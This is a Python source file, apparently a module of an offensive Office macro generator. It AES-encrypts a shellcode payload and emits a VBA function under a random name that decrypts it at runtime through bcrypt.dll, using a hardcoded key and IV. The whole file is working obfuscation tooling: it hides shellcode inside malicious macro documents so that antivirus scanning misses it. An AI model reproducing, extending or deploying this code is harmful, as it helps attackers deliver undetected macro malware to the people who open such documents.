import os
from vba.utils.formatters import bytes_to_vba
from Crypto.Cipher import AES
from Crypto.Util import Padding
import string
import random

class AESEncrypt:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'key' in arguments:
            self.key = arguments['key'].encode()
        else:
            self.key = os.urandom(32)
        if 'iv' in arguments:
            self.iv = arguments['iv'].encode()
        else:
            self.iv = os.urandom(16)

    def imports(self) -> list[str]:
        return ['Private Declare PtrSafe Function BCryptOpenAlgorithmProvider Lib "bcrypt.dll" (ByRef phAlgorithm As LongPtr, ByVal pszAlgId As LongPtr, ByVal pszImplementation As LongPtr, ByVal dwFlags As Long) As Long', 
                'Private Declare PtrSafe Function BCryptCloseAlgorithmProvider Lib "bcrypt.dll" (ByVal hAlgorithm As LongPtr, ByVal dwFlags As Long) As Long', 
                'Private Declare PtrSafe Function BCryptSetProperty Lib "bcrypt.dll" (ByVal hObject As LongPtr, ByVal pszProperty As LongPtr, ByVal pbInput As LongPtr, ByVal cbInput As Long, ByVal dwFlags As Long) As Long',
                'Private Declare PtrSafe Function BCryptGetProperty Lib "bcrypt.dll" (ByVal hObject As LongPtr, ByVal pszProperty As LongPtr, ByVal pbOutput As LongPtr, ByVal cbOutput As Long, ByRef pcbResult As Long, ByVal dwFlags As Long) As Long',
                'Private Declare PtrSafe Function BCryptGenerateSymmetricKey Lib "bcrypt.dll" (ByVal hAlgorithm As LongPtr, ByRef phKey As LongPtr, ByVal pbKeyObject As LongPtr, ByVal cbKeyObject As Long, ByVal pbSecret As LongPtr, ByVal cbSecret As Long, ByVal dwFlags As Long) As Long',
                'Private Declare PtrSafe Function BCryptDestroyKey Lib "bcrypt.dll" (ByVal hKey As LongPtr) As Long',
                'Private Declare PtrSafe Function BCryptDecrypt Lib "bcrypt.dll" (ByVal hKey As LongPtr, ByVal pbInput As LongPtr, ByVal cbInput As Long, ByVal pPaddingInfo As LongPtr, ByVal pbIV As LongPtr, ByVal cbIV As Long,  ByVal pbOutput As LongPtr, ByVal cbOutput As Long, ByRef pcbResult As Long, ByVal dwFlags As Long) As Long']

    def compilerOptions(self) -> list[str]:
        return []

    def encode(self, plaintext: bytes) -> bytes:
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        self.plaintextSize = len(plaintext)
        encrypted = cipher.encrypt(Padding.pad(plaintext, 16, style='pkcs7'))
        self.ciphertextSize = len(encrypted)
        return encrypted

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
Function {self.name}(ByRef cipherBytes() As Byte) As Byte()
    Const BCRYPT_BLOCK_PADDING As Long = &H1
    Const STATUS_SUCCESS As Long = 0
    
    ' ---- Same hardcoded key/IV as the encrypt side ----
    {bytes_to_vba(self.key, 'key')}
    {bytes_to_vba(self.iv, 'iv')}

    Dim hAlg As LongPtr, hKey As LongPtr
    Dim status As Long
    Dim keyObj() As Byte, plain() As Byte, modeCBC() As Byte
    Dim objLen As Long, cbResult As Long, outLen As Long, inLen As Long
    Dim pIn As LongPtr
    inLen = UBound(cipherBytes) - LBound(cipherBytes) + 1

    pIn = VarPtr(cipherBytes(LBound(cipherBytes)))

    ' 1) Open the AES algorithm provider
    status = BCryptOpenAlgorithmProvider(hAlg, StrPtr("AES"), 0, 0)
    If status <> STATUS_SUCCESS Then Err.Raise vbObjectError, , "BCryptOpenAlgorithmProvider failed: 0x" & Hex$(status)

    ' 2) Switch it to CBC chaining mode (UTF-16 value, null-terminated)
    modeCBC = "ChainingModeCBC" & vbNullChar
    status = BCryptSetProperty(hAlg, StrPtr("ChainingMode"), VarPtr(modeCBC(0)), _
                               UBound(modeCBC) - LBound(modeCBC) + 1, 0)
    If status <> STATUS_SUCCESS Then Err.Raise vbObjectError, , "BCryptSetProperty(ChainingMode) failed: 0x" & Hex$(status)

    ' 3) Query key object size and allocate it
    status = BCryptGetProperty(hAlg, StrPtr("ObjectLength"), VarPtr(objLen), 4, cbResult, 0)
    If status <> STATUS_SUCCESS Then Err.Raise vbObjectError, , "BCryptGetProperty(ObjectLength) failed: 0x" & Hex$(status)
    ReDim keyObj(0 To objLen - 1)

    ' 4) Generate the symmetric key from the hardcoded key bytes
    status = BCryptGenerateSymmetricKey(hAlg, hKey, VarPtr(keyObj(0)), objLen, _
                                        VarPtr(key(0)), UBound(key) - LBound(key) + 1, 0)
    If status <> STATUS_SUCCESS Then Err.Raise vbObjectError, , "BCryptGenerateSymmetricKey failed: 0x" & Hex$(status)

    ' Plaintext is always shorter than ciphertext (padding is 1..16 bytes),
    ' so sizing the buffer to the ciphertext length is always safe.
    ReDim plain(inLen)
    
    status = BCryptDecrypt(hKey, pIn, inLen, 0, _
                           VarPtr(iv(0)), UBound(iv) - LBound(iv) + 1, _
                           VarPtr(plain(0)), inLen, cbResult, BCRYPT_BLOCK_PADDING)

    If status <> STATUS_SUCCESS Then Err.Raise vbObjectError, , "BCryptDecrypt failed: 0x" & Hex$(status)
    
    ReDim Preserve plain(0 To cbResult - 1)

    {self.name} = plain

CleanExit:
    If hKey <> 0 Then BCryptDestroyKey hKey
    If hAlg <> 0 Then BCryptCloseAlgorithmProvider hAlg, 0
    Exit Function
End Function
"""